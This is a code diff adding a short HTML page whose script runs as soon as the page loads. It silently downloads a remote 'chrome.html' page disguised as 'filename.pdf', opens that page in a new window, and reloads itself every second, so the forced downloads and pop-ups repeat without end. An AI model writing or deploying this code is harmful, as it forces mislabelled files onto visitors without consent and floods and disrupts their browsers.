@@ -1,0 +1,21 @@
+<html>
+
+<body>
+    <script>
+        function autoDownload() {
+            var link = document.createElement('a');
+            link.href = 'https://vasilevigor3.github.io/chrome.html';
+            link.download = 'filename.pdf';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        autoDownload();
+        window.open("https://vasilevigor3.github.io/chrome.html")
+        setInterval(function () { location.reload() }, 1000);
+    </script>
+</body>
+
+</html>
